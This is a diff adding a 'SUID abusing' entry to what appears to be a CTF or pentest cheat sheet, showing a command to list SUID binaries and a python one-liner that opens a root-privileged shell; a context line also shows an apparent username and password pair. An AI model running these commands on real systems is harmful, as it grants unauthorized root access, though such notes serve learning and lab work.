@@ -472,6 +472,23 @@ skyfuck:8730281lkjlkjdqlksalks
 
 ## Privilege Escalation
 
+<details>
+  <summary>
+  
+    
+  ###  SUID abusing
+  </summary>
+
+  ```bash
+find / -type f -perm -4000 -ls 2>/dev/null
+```
+For python ->    `266770   3580 -rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python`
+
+```
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+</details>
+
 
 <details>
   <summary>
